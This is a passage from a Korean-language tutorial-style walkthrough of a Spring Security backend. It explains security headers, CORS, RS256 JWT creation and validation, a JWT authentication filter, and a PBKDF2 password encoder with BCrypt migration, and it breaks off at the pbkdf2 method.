7. **`NO_REFERRER`** — 다른 사이트로 이동할 때 "어디서 왔는지"를 알리지 않습니다. 주소에 개인정보가 섞여 나가는 걸 막습니다.
8. **HSTS** — "앞으로 1년간 HTTPS 로만 접속해라"를 브라우저에 각인시킵니다. `includeSubDomains(true)` 는 하위 도메인까지 포함.
9. **Permissions-Policy** — 스프링이 기본 지원하지 않는 헤더라 직접 적어 넣습니다.

```java
        .exceptionHandling(
            ex ->
                ex.authenticationEntryPoint(
                        (request, response, authException) ->
                            writeError(response, ErrorCode.INVALID_TOKEN))       // (10)
                    .accessDeniedHandler(
                        (request, response, deniedException) ->
                            writeError(response, ErrorCode.ACCESS_DENIED)))      // (11)
```

10. **`authenticationEntryPoint`** — **로그인이 안 된 채로** 보호된 주소를 부르면 실행됩니다 → 401.
11. **`accessDeniedHandler`** — 로그인은 됐지만 **권한이 모자랄 때** 실행됩니다 → 403.

    > 왜 필요한가: 이 두 상황은 **컨트롤러에 닿기 전**에 처리되므로, `GlobalExceptionHandler` 가 못 잡습니다. 그냥 두면 스프링 기본 HTML 오류 페이지가 나가서 응답 모양이 제각각이 됩니다.

```java
        .addFilterBefore(
            new JwtAuthenticationFilter(jwtTokenProvider),
            UsernamePasswordAuthenticationFilter.class);                  // (12)

    return http.build();
  }
```

12. **우리 문지기를 줄에 끼워 넣습니다.** 스프링 시큐리티는 여러 필터가 **줄 서서** 차례로 도는 구조인데, `UsernamePasswordAuthenticationFilter`(아이디/비번 폼 로그인 담당) **앞에** 우리 JWT 필터를 세웁니다. 그래야 권한 검사가 일어나기 전에 "누구인지"가 정해집니다.

#### CORS 설정 만들기

```java
  @Bean
  public CorsConfigurationSource corsConfigurationSource(CorsProperties corsProperties) {
    CorsConfiguration configuration = new CorsConfiguration();
    configuration.setAllowedOrigins(List.copyOf(corsProperties.getAllowedOrigins()));  // (1)
    configuration.setAllowedMethods(List.copyOf(corsProperties.getAllowedMethods()));
    configuration.setAllowedHeaders(List.copyOf(corsProperties.getAllowedHeaders()));
    configuration.setAllowCredentials(corsProperties.isAllowCredentials());            // (2)
    configuration.setMaxAge(corsProperties.getMaxAge());

    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/api/**", configuration);                        // (3)
    return source;
  }
```

1. **`List.copyOf`** — 목록을 **읽기 전용으로 복사**합니다. 나중에 누가 실수로 목록에 값을 넣어도 보안 설정이 바뀌지 않습니다.
2. **`isAllowCredentials`** — `boolean` 필드의 getter 는 `get` 이 아니라 **`is`** 로 시작합니다. 자바의 관례입니다.
3. **`/api/**`** — 이 설정을 적용할 주소 범위. `**` 는 "그 아래 전부".

#### 오류를 직접 쓰는 메서드

```java
  private static void writeError(HttpServletResponse response, ErrorCode errorCode)
      throws IOException {
    response.setStatus(errorCode.getStatus().value());                    // (1)
    response.setContentType("application/json");                          // (2)
    response.setCharacterEncoding(StandardCharsets.UTF_8.name());         // (3)
    response
        .getWriter()
        .write(
            "{\"status\":%d,\"message\":\"%s\"}"                          // (4)
                .formatted(errorCode.getStatus().value(), errorCode.getMessage()));
  }
```

1. 상태 코드를 정합니다 (401, 403).
2. "이 응답은 JSON 이다"라고 알립니다.
3. **UTF-8 을 지정**해야 한글 메시지가 깨지지 않습니다.
4. **JSON 을 문자열로 직접 씁니다.** `\"` 는 문자열 안에 큰따옴표를 넣는 방법이고, `%d`(숫자)·`%s`(문자열) 자리에 `.formatted(...)` 의 값이 들어갑니다.

   > 왜 `ErrorResponse` 객체를 안 쓰나요? — 여기는 **스프링 MVC 바깥**이라 객체를 JSON 으로 바꿔 주는 기능이 아직 붙기 전입니다. 그래서 손으로 적습니다. 모양은 `ErrorResponse` 와 똑같이 맞춰 뒀습니다.

---

### 3-6. `JwtTokenProvider.java` — 출입증 발급기

#### JWT 가 뭔가요

점 두 개로 나뉜 **긴 문자열**입니다.

```
eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxIiwianRpIjoiYWJj...,.Xk3jQm9...
└────── 머리 ──────┘ └────────── 내용 ──────────┘ └── 서명 ──┘
```

- **머리** — 어떤 방식으로 서명했는지 (여기서는 RS256)
- **내용** — 누구인지, 언제 만들었는지, 언제까지 유효한지
- **서명** — 서버가 개인키로 만든 도장

**내용은 암호화돼 있지 않습니다.** 누구나 읽을 수 있습니다. 하지만 **고치면 서명이 안 맞아서** 서버가 바로 거부합니다. 그러므로 토큰에 비밀을 담으면 안 됩니다.

#### 클래스 선언

```java
@Component
@RequiredArgsConstructor
public class JwtTokenProvider {

  public static final String TOKEN_TYPE_CLAIM = "typ";                    // (1)

  private final JwtConfig jwtConfig;                                      // (2)
  private final ResourceLoader resourceLoader = new DefaultResourceLoader(); // (3)

  private PrivateKey privateKey;                                          // (4)
  private PublicKey publicKey;
```

1. **`typ`** — 토큰 안에 적어 둘 항목 이름입니다. **액세스 토큰과 리프레시 토큰을 구분하는 표식**으로, 이 프로젝트에서 대단히 중요합니다.

   > **없으면 무슨 일이 생기나** — 두 토큰은 만료 기간만 다르고 내용이 같습니다. 그러면 **리프레시 토큰을 `Authorization` 헤더에 넣어도 그대로 통과**합니다. 즉 14일짜리 액세스 토큰이 되어 버리고, 수명을 15분으로 짧게 잡은 의미가 사라집니다.
2. 설정값 그릇을 주입받습니다.
3. **파일을 읽는 도구.** `classpath:` 로 시작하는 프로젝트 내부 경로와 `file:` 로 시작하는 실제 파일 경로를 **같은 방식으로** 읽을 수 있습니다. 개발은 `classpath:`, 운영은 `file:` 을 쓰므로 유용합니다.
4. **개인키와 공개키.** `@PostConstruct` 에서 채우기 때문에 `final` 이 아닙니다.

#### 키를 왜 두 개 쓰나 (RS256)

| | 개인키 (private) | 공개키 (public) |
|---|---|---|
| 하는 일 | 서명을 **만듦** | 서명을 **확인** |
| 누가 가짐 | 발급 서버만 | 검증만 하면 되는 곳은 이것만 있으면 됨 |
| 유출되면 | 토큰을 마음대로 위조 가능 (치명적) | 확인만 가능. 만들지는 못함 |

열쇠 하나로 만들고 확인하는 방식(HS256)도 있지만, 그러면 **검증만 하는 서버에도 위조할 수 있는 열쇠를 줘야** 합니다. 나중에 서비스를 여러 개로 나눌 때 문제가 되므로 처음부터 키를 나눠 뒀습니다.

#### 시작할 때 키 읽기

```java
  @PostConstruct
  private void init() throws IOException, GeneralSecurityException {
    this.privateKey = readPrivateKey(jwtConfig.getPrivateKeyPath());
    this.publicKey = readPublicKey(jwtConfig.getPublicKeyPath());
  }
```

**서버가 뜰 때 딱 한 번** 읽습니다. 토큰을 만들 때마다 파일을 읽으면 느리기 때문입니다.
그리고 키 파일이 없거나 깨져 있으면 **서버가 아예 안 뜹니다.** 운영 중에 발견하는 것보다 시작할 때 터지는 게 낫습니다(fail fast).

#### 토큰 만들기

```java
  public String createAccessToken(Long userId) {
    return createToken(userId, TokenType.ACCESS, jwtConfig.getAccessTokenExpiration());
  }

  public String createRefreshToken(Long userId) {
    return createToken(userId, TokenType.REFRESH, jwtConfig.getRefreshTokenExpiration());
  }
```

겉으로는 두 개지만 속은 같은 메서드를 부릅니다. 부르는 쪽이 헷갈리지 않게 이름을 나눠 둔 것입니다.

```java
  private String createToken(Long userId, TokenType type, long expiration) {
    Date now = new Date();                                                // (1)
    Date expiry = new Date(now.getTime() + expiration);                   // (2)

    return Jwts.builder()
        .subject(String.valueOf(userId))                                  // (3)
        .id(UUID.randomUUID().toString())                                 // (4)
        .claim(TOKEN_TYPE_CLAIM, type.value())                            // (5)
        .issuedAt(now)                                                    // (6)
        .expiration(expiry)                                               // (7)
        .signWith(privateKey, Jwts.SIG.RS256)                             // (8)
        .compact();                                                       // (9)
  }
```

1. 지금 시각.
2. 만료 시각 = 지금 + 설정한 밀리초. `getTime()` 은 1970년부터 흐른 밀리초를 돌려줍니다.
3. **`subject`(sub)** — "이 토큰은 누구 것인가". 회원 번호를 문자열로 담습니다.
4. **`id`(jti)** — 토큰마다 다른 고유 번호. **같은 순간에 발급해도 토큰이 서로 다르게** 만들어 줍니다. 나중에 "이 토큰 하나만 무효화" 하는 기능을 넣을 때도 이 값을 씁니다.
5. **`typ`** — `"access"` 또는 `"refresh"`.
6. `iat` — 발급 시각.
7. `exp` — 만료 시각. **jjwt 라이브러리가 검증할 때 이 값을 자동으로 확인**합니다.
8. **서명** — 개인키로 도장을 찍습니다. 이 한 줄 때문에 위조가 불가능해집니다.
9. **`compact()`** — 최종 문자열로 만듭니다.

#### 토큰 읽고 확인하기

```java
  public Optional<Long> resolveUserId(String token, TokenType expectedType) {   // (1)
    if (token == null || token.isBlank()) {
      return Optional.empty();                                                  // (2)
    }

    try {
      Claims claims = parseClaims(token);                                       // (3)

      if (!expectedType.value().equals(claims.get(TOKEN_TYPE_CLAIM, String.class))) {
        return Optional.empty();                                                // (4)
      }

      return Optional.of(Long.valueOf(claims.getSubject()));                    // (5)
    } catch (JwtException | IllegalArgumentException e) {                       // (6)
      return Optional.empty();
    }
  }
```

1. **`Optional<Long>`** — "회원 번호가 나올 수도, 안 나올 수도 있다"를 타입으로 표현합니다. `null` 을 돌려주면 받는 쪽이 검사를 깜빡할 수 있는데, `Optional` 은 **꺼내려면 반드시 한 단계를 거쳐야** 해서 실수를 막습니다.
2. 토큰이 없으면 빈 결과.
3. **서명과 만료를 확인하고 내용을 꺼냅니다.** 여기서 하나라도 어긋나면 예외가 납니다.
4. **종류가 다르면 거부.** 액세스를 기대했는데 리프레시가 오면 여기서 막힙니다.
5. `subject` 에 담아 둔 문자열을 숫자로 되돌립니다.
6. **`|`** 로 두 예외를 한 번에 잡습니다.
   - `JwtException` : 서명이 틀림, 만료됨, 모양이 깨짐
   - `IllegalArgumentException` : `subject` 가 숫자가 아님

   **어느 쪽이든 결론은 같습니다 — 못 믿을 토큰.** 그래서 구분하지 않고 빈 결과를 돌려줍니다.

   > 그리고 **왜 틀렸는지 밖에 알리지 않는 것**도 의도적입니다. "서명이 틀렸다" vs "만료됐다"를 알려 주면 공격자에게 힌트가 됩니다.

```java
  private Claims parseClaims(String token) {
    return Jwts.parser().verifyWith(publicKey).build().parseSignedClaims(token).getPayload();
  }
```

한 줄에 네 단계가 이어져 있습니다: 파서 준비 → **공개키로 검증하라고 지정** → 파서 완성 → **서명된 토큰으로 해석** → 내용 꺼내기.
`parseSignedClaims` 라는 이름이 핵심입니다. 서명을 확인하지 않고 내용만 꺼내는 메서드도 있는데, 그걸 쓰면 **누구나 위조한 토큰이 통과**합니다.

#### PEM 키 파일 읽기

```java
  private PrivateKey readPrivateKey(String location) throws IOException, GeneralSecurityException {
    byte[] decoded = Base64.getDecoder().decode(readPem(location, "PRIVATE KEY"));      // (1)
    return KeyFactory.getInstance("RSA").generatePrivate(new PKCS8EncodedKeySpec(decoded)); // (2)
  }

  private PublicKey readPublicKey(String location) throws IOException, GeneralSecurityException {
    byte[] decoded = Base64.getDecoder().decode(readPem(location, "PUBLIC KEY"));
    return KeyFactory.getInstance("RSA").generatePublic(new X509EncodedKeySpec(decoded)); // (3)
  }
```

**PEM 파일**은 이렇게 생겼습니다.

```
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC...
-----END PRIVATE KEY-----
```

1. 머리말·꼬리말과 줄바꿈을 걷어낸 뒤, **Base64 를 바이트로 되돌립니다.** (Base64 = 바이너리를 글자로만 적는 방법)
2. **PKCS8** — 개인키를 담는 표준 형식.
3. **X509** — 공개키를 담는 표준 형식. 개인키와 공개키는 담는 형식이 달라서 메서드가 나뉩니다.

```java
  private String readPem(String location, String type) throws IOException {
    Resource resource = resourceLoader.getResource(location);
    try (InputStream inputStream = resource.getInputStream()) {            // (1)
      String content = StreamUtils.copyToString(inputStream, StandardCharsets.UTF_8);
      return content
          .replace("-----BEGIN " + type + "-----", "")                     // (2)
          .replace("-----END " + type + "-----", "")
          .replaceAll("\\s", "");                                          // (3)
    }
  }
```

1. **`try (...)`** — try-with-resources 문법입니다. 괄호 안에서 연 것을 **블록이 끝날 때 자동으로 닫아 줍니다.** 파일을 안 닫으면 자원이 새기 때문에 중요합니다.
2. 머리말·꼬리말을 빈 문자열로 바꿔서 제거.
3. **`\\s`** 는 "공백 문자"(스페이스·줄바꿈·탭)를 뜻하는 정규식입니다. 전부 지워서 Base64 글자만 남깁니다.
   > 자바 문자열에서 역슬래시를 쓰려면 `\\` 로 두 번 적어야 합니다.

#### 토큰 종류 enum

```java
  public enum TokenType {
    ACCESS("access"),                                                     // (1)
    REFRESH("refresh");

    private final String value;

    TokenType(String value) {                                             // (2)
      this.value = value;
    }

    public String value() {
      return value;
    }
  }
```

1. **`enum` 은 값을 가질 수 있습니다.** `ACCESS` 라는 상수가 `"access"` 라는 문자열을 들고 있습니다.
2. enum 의 생성자는 **자동으로 `private`** 입니다. 밖에서 새로 만들 수 없고, 정해진 두 개만 존재합니다.

**문자열 `"access"` 를 그냥 쓰면 안 되나요?** — 됩니다. 하지만 `"acess"` 처럼 오타를 내면 **컴파일은 되고 런타임에 조용히 틀립니다.** enum 을 쓰면 오타가 컴파일 단계에서 걸립니다.

---

### 3-7. `JwtAuthenticationFilter.java` — 요청마다 서 있는 문지기

48줄짜리 작은 클래스인데, **모든 요청이 여기를 지나갑니다.**

```java
@RequiredArgsConstructor
public class JwtAuthenticationFilter extends OncePerRequestFilter {       // (1)

  private static final String AUTHORIZATION_HEADER = "Authorization";
  private static final String BEARER_PREFIX = "Bearer ";                  // (2)

  private final JwtTokenProvider jwtTokenProvider;
```

1. **`OncePerRequestFilter`** — 스프링이 주는 필터 뼈대입니다. 이름 그대로 **요청 하나당 정확히 한 번만** 돕니다. (요청이 내부에서 다른 경로로 넘어갈 때 두 번 도는 걸 막아 줍니다)
2. **`"Bearer "`** — 끝의 **공백까지 포함**입니다. 토큰을 보낼 때의 약속된 형식입니다.
   ```
   Authorization: Bearer eyJhbGciOiJSUzI1NiJ9...
   ```

> 이 클래스에는 `@Component` 가 없습니다. `SecurityConfig` 에서 `new JwtAuthenticationFilter(...)` 로 직접 만들기 때문입니다. 빈으로 만들면 시큐리티 체인 바깥에서도 자동 등록돼 두 번 도는 문제가 생길 수 있어, 필요한 곳에서만 만들어 끼웁니다.

#### 실제 동작

```java
  @Override                                                               // (1)
  protected void doFilterInternal(
      HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)
      throws ServletException, IOException {

    jwtTokenProvider
        .resolveUserId(resolveToken(request), TokenType.ACCESS)           // (2)
        .ifPresent(                                                       // (3)
            userId ->
                SecurityContextHolder.getContext()                        // (4)
                    .setAuthentication(
                        new UsernamePasswordAuthenticationToken(
                            userId, null, Collections.emptyList())));     // (5)

    filterChain.doFilter(request, response);                              // (6)
  }
```

1. **`@Override`** — 부모 클래스의 메서드를 덮어쓴다는 표시. 이름을 잘못 적으면 컴파일 오류가 나므로 붙이는 게 좋습니다.
2. **헤더에서 토큰을 꺼내 확인합니다.** `TokenType.ACCESS` 를 넘기므로 **리프레시 토큰으로는 API 를 부를 수 없습니다.**
3. **`ifPresent`** — `Optional` 에 값이 있을 때만 안쪽을 실행합니다. 없으면 아무 일도 안 합니다.
4. **`SecurityContextHolder`** — "지금 이 요청은 누가 보낸 것인가"를 담아 두는 보관함입니다. 요청 하나가 끝날 때까지 유지되고, 요청끼리 섞이지 않습니다.
5. **여기에 담는 값이 곧 `@AuthenticationPrincipal` 로 나옵니다.**
   - 첫 번째 `userId` → **principal**(누구인가). 그래서 컨트롤러에서 `@AuthenticationPrincipal Long userId` 로 바로 받을 수 있습니다.
   - 두 번째 `null` → 자격 증명(비밀번호). 이미 토큰으로 확인했으므로 필요 없습니다.
   - 세 번째 `emptyList()` → 권한 목록. 아직 역할 기반 권한을 안 쓰므로 빈 목록입니다.
6. **`filterChain.doFilter(...)`** — **다음 필터로 넘깁니다. 이걸 안 부르면 요청이 여기서 멈춥니다.**

> **중요: 이 필터는 아무도 막지 않습니다.**
> 토큰이 없든, 틀렸든 그냥 통과시킵니다. "누구인지"만 적어 둘 뿐입니다.
> 실제로 막는 건 뒤에 있는 [`SecurityConfig` 의 `anyRequest().authenticated()`](#3-5-securityconfigjava--보안-규칙-조립) 이고, 거기서 **아무도 안 적혀 있으면** 401 을 냅니다.
>
> **역할을 나눈 이유**: 이 필터가 직접 막으면, `/api/auth/login` 처럼 토큰이 없어야 정상인 주소까지 막아 버립니다. "신원 확인"과 "출입 허가"를 분리한 것입니다.

#### 헤더에서 토큰 꺼내기

```java
  private String resolveToken(HttpServletRequest request) {
    String bearerToken = request.getHeader(AUTHORIZATION_HEADER);
    if (StringUtils.hasText(bearerToken) && bearerToken.startsWith(BEARER_PREFIX)) {  // (1)
      return bearerToken.substring(BEARER_PREFIX.length());                           // (2)
    }
    return null;                                                                      // (3)
  }
```

1. **`hasText`** — `null` 도 아니고, 빈 문자열도 아니고, 공백만 있는 것도 아닐 때 참. `!= null` 보다 안전합니다.
2. **`"Bearer "` 7글자를 잘라내고** 토큰만 남깁니다.
3. 헤더가 없거나 형식이 다르면 `null`. 그러면 위의 `resolveUserId` 가 빈 결과를 돌려줍니다.

---
### 3-8. `NanumiPasswordProperties.java` — 해시 설정값

```java
@Getter
@Setter
@Component
@ConfigurationProperties(prefix = "nanumi.security.password")
public class NanumiPasswordProperties {

  private int iterations = 210_000;                                       // (1)

  private String pepper = "";                                             // (2)
}
```

1. **반복 횟수 기본값 21만.** `210_000` 의 밑줄은 자릿수 구분용이라 값에 영향이 없습니다.
2. **pepper 기본값은 빈 문자열.** 설정을 안 하면 pepper 없이 동작합니다. 그래서 `application-prod.yml` 에서는 **기본값을 두지 않아** 값이 없으면 서버가 아예 안 뜨게 해 뒀습니다. ([3-19](#3-19-applicationyml--설정-파일) 참고)

`application.yml` 과의 대응:

```yaml
nanumi:
  security:
    password:
      iterations: 210000          →  iterations
      pepper: ${PASSWORD_PEPPER:nanumi-local-dev-pepper}   →  pepper
```

---

### 3-9. `NanumiPasswordEncoder.java` — 비밀번호 해싱

#### 왜 이 클래스가 필요한가

**비밀번호를 원문 그대로 저장하면 절대 안 됩니다.** DB 가 한 번 유출되면 모든 회원의 비밀번호가 그대로 새어 나가고, 사람들은 다른 사이트에서도 같은 비밀번호를 쓰기 때문에 피해가 우리 서비스 밖으로 번집니다.

그래서 **되돌릴 수 없는 형태(해시)** 로 바꿔서 저장하고, 로그인할 때는 이렇게 확인합니다.

```
저장할 때  : "nanumi1234!"  →  해싱  →  "$nanumi$1$210000$ES9d...$Xo1r..."  → DB 에 저장
로그인할 때 : 입력한 비밀번호를 같은 방식으로 해싱 → 저장된 값과 같은가?
```

#### 저장되는 문자열의 모양

```
$nanumi$1$210000$ES9dxu6QeMBGl8fA4kR6bw$Xo1rK7...(43자)
│└──┬─┘│└──┬──┘ │└────────┬───────────┘│└───┬────┘
│  이름 │ 반복횟수 │        salt          │   해시값
└ 구분자 └ 버전
```

| 조각 | 글자 수 | 뜻 |
|---|---|---|
| `$nanumi$` | 8 | 우리 형식이라는 표시 |
| `1$` | 2 | 형식 버전 |
| `210000$` | 7 | 몇 번 반복했는지 |
| salt | 22 | 무작위 16바이트를 Base64 로 |
| 해시 | 43 | 결과 32바이트를 Base64 로 |
| **합계** | **83** | → `Account.password` 컬럼이 `length = 83` 인 이유 |

**핵심 아이디어: "어떻게 만들었는지"를 해시 안에 같이 적어 둡니다.**
나중에 반복 횟수를 60만으로 올려도, 예전 해시는 자기 안에 적힌 `210000` 을 보고 검증되므로 **기존 회원이 그대로 로그인됩니다.**

#### 클래스 선언과 상수

```java
@Component
@RequiredArgsConstructor
public class NanumiPasswordEncoder implements PasswordEncoder {           // (1)

  private static final String ALGORITHM = "PBKDF2WithHmacSHA256";         // (2)
  private static final String PREFIX = "nanumi";
  private static final int VERSION = 1;                                   // (3)
  private static final int SALT_BYTES = 16;                               // (4)
  private static final int HASH_BYTES = 32;                               // (5)
  private static final char SEPARATOR = '$';

  private static final String[] BCRYPT_PREFIXES = {"$2a$", "$2b$", "$2y$"}; // (6)

  private static final SecureRandom RANDOM = new SecureRandom();          // (7)
  private static final Base64.Encoder ENCODER = Base64.getUrlEncoder().withoutPadding(); // (8)
  private static final Base64.Decoder DECODER = Base64.getUrlDecoder();

  private final NanumiPasswordProperties properties;                      // (9)
  private final BCryptPasswordEncoder legacyEncoder = new BCryptPasswordEncoder(); // (10)
```

1. **`implements PasswordEncoder`** — 스프링 시큐리티가 정한 규격을 따릅니다. 규격이 요구하는 메서드는 세 개입니다.
   - `encode` — 해시 만들기
   - `matches` — 맞춰 보기
   - `upgradeEncoding` — 다시 해싱해야 하는지 알려 주기

   > 규격을 따르면 나중에 스프링 시큐리티의 다른 기능과 맞물릴 때 그대로 쓸 수 있습니다. 다만 지금 `AuthService` 는 **이 클래스를 구체 타입 그대로** 주입받습니다(`private final NanumiPasswordEncoder nanumiPasswordEncoder;`). 이 프로젝트 안에서 다른 구현으로 바꿀 계획이 없어, `isLegacyHash` 같은 우리 전용 메서드까지 바로 쓸 수 있게 한 선택입니다.
2. **PBKDF2** — Password-Based Key Derivation Function 2. 비밀번호 전용으로 만들어진 표준 해시 방식입니다. **특징은 "일부러 느리다"는 것**입니다.

   > SHA-256 을 한 번만 돌리면 요즘 GPU 로 **초당 수십억 번** 대입할 수 있습니다. 21만 번 반복시키면 그 속도가 21만분의 1로 떨어집니다. 로그인하는 사람에게는 0.1초지만, 수십억 개를 시도하려는 공격자에게는 감당 못 할 비용이 됩니다. **느린 게 기능입니다.**
3. **버전** — 나중에 알고리즘 자체를 바꾸면 `2` 로 올립니다. 그러면 기존 해시들이 자동으로 재해싱 대상이 됩니다.
4. **salt 16바이트** — Base64 로 바꾸면 22글자가 됩니다.
5. **해시 32바이트** — 256비트. Base64 로 43글자.
6. **BCrypt 접두사** — 예전에 BCrypt 로 저장된 해시를 알아보기 위한 표식. BCrypt 해시는 반드시 이 셋 중 하나로 시작합니다. (역사적으로 버전 표기가 여러 개 생겨서 셋입니다)
7. **`SecureRandom`** — 그냥 `Random` 이 아닙니다.
   > `Random` 은 앞의 몇 개 값만 보면 **다음 값을 예측**할 수 있습니다. 보안용으로 쓰면 안 됩니다. `SecureRandom` 은 운영체제의 예측 불가능한 잡음을 씨앗으로 씁니다.
8. **`withoutPadding()`** — Base64 끝에 붙는 `=` 를 뗍니다. 이것 덕분에 salt 가 24자가 아니라 **22자**, 해시가 44자가 아니라 **43자**가 되어 전체가 정확히 83자로 떨어집니다.
   **`getUrlEncoder()`** 는 일반 Base64 의 `+` `/` 대신 `-` `_` 를 씁니다. 어느 쪽이든 `$` 는 나오지 않으므로 구분자와 충돌하지 않습니다.
9. 설정값 그릇. 스프링이 주입합니다.
10. **예전 BCrypt 해시를 검증할 때만 쓰는 도구.** 여기서 `new` 로 만들었으므로 `@RequiredArgsConstructor` 의 생성자 파라미터에 **들어가지 않습니다.**

#### `encode` — 비밀번호를 해시로

```java
  @Override
  public String encode(CharSequence rawPassword) {                        // (1)
    if (rawPassword == null) {
      throw new IllegalArgumentException("비밀번호가 비어 있음");           // (2)
    }

    byte[] salt = new byte[SALT_BYTES];
    RANDOM.nextBytes(salt);                                               // (3)

    int iterations = resolveIterations();                                 // (4)
    byte[] hash = pbkdf2(rawPassword, salt, iterations);                  // (5)

    return new StringBuilder()                                            // (6)
        .append(SEPARATOR).append(PREFIX)          // "$nanumi"
        .append(SEPARATOR).append(VERSION)         // "$1"
        .append(SEPARATOR).append(iterations)      // "$210000"
        .append(SEPARATOR).append(ENCODER.encodeToString(salt))
        .append(SEPARATOR).append(ENCODER.encodeToString(hash))
        .toString();
  }
```

1. **`CharSequence`** — `String` 보다 넓은 타입입니다. `String`, `StringBuilder`, `char[]` 를 감싼 것 등이 모두 들어옵니다. 스프링 시큐리티 규격이 이렇게 정해 뒀습니다.
2. **여기서는 예외를 던집니다.** 비밀번호가 `null` 인 채로 저장되는 건 사용자 실수가 아니라 **우리 코드의 버그**입니다. 조용히 넘기면 나중에 훨씬 찾기 어려워지므로 바로 터뜨립니다.
3. **salt 를 매번 새로 뽑습니다.** 이게 왜 중요한가:
   - salt 가 없으면 `1234` 를 쓰는 **모든 회원의 해시가 똑같아집니다.** DB 만 봐도 "이 사람들 비밀번호 같네"를 알 수 있습니다.
   - 공격자가 미리 계산해 둔 표(레인보우 테이블)로 한 번에 뚫립니다.
   - salt 를 섞으면 같은 `1234` 라도 회원마다 해시가 다르고, 미리 계산해 둘 수도 없습니다.

   > **salt 는 비밀이 아닙니다.** 그래서 해시 문자열에 대놓고 같이 저장합니다. 검증할 때 필요하니까요. salt 의 목적은 "숨기는 것"이 아니라 "**미리 계산해 두는 것을 불가능하게 만드는 것**"입니다.
4. 지금 설정된 반복 횟수를 가져옵니다.
5. 실제 해싱. 시간이 걸리는 건 이 줄입니다.
6. **조각을 이어 붙입니다.** `StringBuilder` 는 문자열을 여러 번 이어 붙일 때 `+` 보다 효율적입니다.

#### `matches` — 맞춰 보기

```java
  @Override
  public boolean matches(CharSequence rawPassword, String encodedPassword) {
    if (rawPassword == null || encodedPassword == null || encodedPassword.isEmpty()) {
      return false;                                                       // (1)
    }

    if (isLegacyHash(encodedPassword)) {
      return legacyEncoder.matches(rawPassword, encodedPassword);         // (2)
    }

    ParsedHash parsed = parse(encodedPassword);                           // (3)
    if (parsed == null) {
      return false;
    }

    byte[] actual = pbkdf2(rawPassword, parsed.salt(), parsed.iterations()); // (4)

    return MessageDigest.isEqual(parsed.hash(), actual);                  // (5)
  }
```

1. **여기서는 예외를 던지지 않고 `false` 를 돌려줍니다.** `encode` 와 반대입니다.
   > 로그인 검증 중이므로 **"못 믿겠으면 실패"** 가 안전합니다. 이걸 fail closed(닫힌 채로 실패)라고 합니다. 반대로 애매할 때 통과시키는 걸 fail open 이라고 하는데, 보안에서는 절대 하면 안 됩니다.
2. **예전 BCrypt 해시면 BCrypt 방식으로 맞춰 봅니다.** 예전에 가입한 회원도 로그인은 계속 되어야 하기 때문입니다.
3. 저장된 문자열을 조각냅니다. 형식이 깨져 있으면 `null` → 실패.
4. **중요: `parsed.iterations()` 를 씁니다. 지금 설정값이 아닙니다.**
   저장할 때 쓴 횟수 그대로 돌려야 같은 결과가 나옵니다. 이것 때문에 설정을 21만 → 60만으로 올려도 기존 회원이 문제없이 로그인됩니다.
5. **`MessageDigest.isEqual` — 상수 시간 비교.**

   `Arrays.equals` 를 쓰면 안 되나요? 동작은 같지만 **걸리는 시간이 다릅니다.**

   ```
   일반 비교 : 다른 바이트를 만나는 순간 멈춤
              첫 바이트가 틀림   → 아주 빨리 끝남
              30바이트가 맞음    → 조금 더 걸림
   ```

   이 **미세한 시간 차를 수만 번 측정하면 해시를 앞에서부터 한 바이트씩 알아낼 수 있습니다**(타이밍 공격). `MessageDigest.isEqual` 은 틀려도 끝까지 다 비교해서 **항상 같은 시간**이 걸립니다.

#### `upgradeEncoding` — 다시 해싱해야 하나?

```java
  @Override
  public boolean upgradeEncoding(String encodedPassword) {
    if (encodedPassword == null || encodedPassword.isEmpty()) {
      return false;
    }

    if (isLegacyHash(encodedPassword)) {
      return true;                                                        // (1)
    }

    ParsedHash parsed = parse(encodedPassword);
    if (parsed == null) {
      return false;                                                       // (2)
    }

    return parsed.version() != VERSION || parsed.iterations() < resolveIterations(); // (3)
  }
```

1. **BCrypt 해시는 무조건 새 형식으로 갈아탑니다.**
2. **못 읽는 해시는 손대지 않습니다.** 다시 해싱해도 의미가 없고, 오히려 멀쩡한 값을 덮어쓸 위험이 있습니다.
3. **버전이 다르거나**(알고리즘이 바뀜) **반복 횟수가 지금 설정보다 낮으면**(더 강하게 해야 함) 참.

   > `<` 인 것도 의도적입니다. 설정보다 **높은** 해시는 그냥 둡니다. 실수로 반복 횟수를 낮췄을 때 기존 회원의 보안 수준을 깎아내리지 않기 위해서입니다.

**언제 불리나** — [`AuthService.login()`](#3-15-authservicejava--실제로-판단하는-곳) 에서 **비밀번호가 맞은 직후에만** 부릅니다.

```java
if (nanumiPasswordEncoder.upgradeEncoding(account.getPassword())) {
  account.changePassword(nanumiPasswordEncoder.encode(request.password()));
}
```

**평문 비밀번호를 손에 쥘 수 있는 순간이 거기뿐이기 때문입니다.** DB 에는 해시만 있으니 나중에는 다시 해싱하고 싶어도 할 수 없습니다.
덕분에 `application.yml` 의 `iterations` 를 올려 두기만 하면, **회원들이 로그인할 때마다 알아서 강한 해시로 바뀝니다.** 별도의 마이그레이션 작업이 필요 없습니다.

#### `isLegacyHash` — 예전 해시인가

```java
  public boolean isLegacyHash(String encodedPassword) {
    if (encodedPassword == null) {
      return false;
    }
    for (String prefix : BCRYPT_PREFIXES) {                               // (1)
      if (encodedPassword.startsWith(prefix)) {
        return true;
      }
    }
    return false;
  }
```

1. **향상된 for 문**입니다. `BCRYPT_PREFIXES` 배열의 값을 하나씩 `prefix` 에 넣어 가며 반복합니다.

#### `resolveIterations` — 설정값 확인

```java
  private int resolveIterations() {
    int iterations = properties.getIterations();
    if (iterations < 1) {
      throw new IllegalStateException("PBKDF2 반복 횟수는 1 이상이어야 함: " + iterations);
    }
    return iterations;
  }
```

설정값을 그냥 믿지 않고 한 번 확인합니다. 0 이나 음수가 들어오면 아래 `PBEKeySpec` 이 알아보기 어려운 오류로 터지므로, **우리가 먼저 알아보기 쉬운 메시지로** 터뜨립니다.

> **현재 비어 있는 안전장치**: 상한 검사가 없습니다. 반복 횟수를 7자리(100만 이상)로 설정하면 해시 문자열이 **84자**가 되어 `length = 83` 인 컬럼에 저장이 실패합니다. 해시 길이를 83 으로 유지하기로 한 이상, 여기에 `iterations > 999_999` 검사를 더해 두면 그 사고를 서버 기동 단계에서 막을 수 있습니다.

#### `pbkdf2` — 실제 해싱

```java
